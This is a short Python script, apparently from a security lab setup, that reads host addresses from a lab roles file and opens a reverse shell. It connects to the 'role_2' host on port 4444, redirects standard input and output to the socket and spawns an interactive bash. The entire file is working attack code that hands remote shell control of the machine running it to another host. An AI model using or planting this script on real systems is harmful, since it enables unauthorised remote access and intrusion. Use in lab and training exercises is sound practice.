#!/usr/bin/env python3

import os
import pty
import socket

roles = {}

with open("/opt/lab_roles_ip.txt", "r", encoding="utf-8") as f:
    for line in f:
        line = line.strip()

        if "=" in line:
            key, value = line.split("=", 1)
            roles[key] = value

host = roles["role_2"]
port = 4444

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((host, port))

os.dup2(sock.fileno(), 0)
os.dup2(sock.fileno(), 1)
os.dup2(sock.fileno(), 2)

pty.spawn(["/bin/bash", "-i"])
